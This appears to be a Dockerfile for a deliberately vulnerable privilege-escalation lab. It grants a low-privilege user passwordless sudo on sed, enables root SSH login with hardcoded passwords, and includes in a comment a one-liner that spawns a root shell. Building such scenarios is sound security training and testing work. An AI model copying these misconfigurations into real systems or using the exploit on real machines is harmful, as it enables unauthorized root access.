FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_sed
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/sed as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and sed (sed is included in base but be explicit)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        sed \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify sed is installed
RUN which sed && ls -la /usr/bin/sed

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# sed's 'e' command executes the pattern space as a shell command.
# Exploit: sudo sed -n '1e exec /bin/sh 1>&0' /etc/hosts
# This spawns a root shell.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/sed" > /etc/sudoers.d/sed && \
    chmod 440 /etc/sudoers.d/sed

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]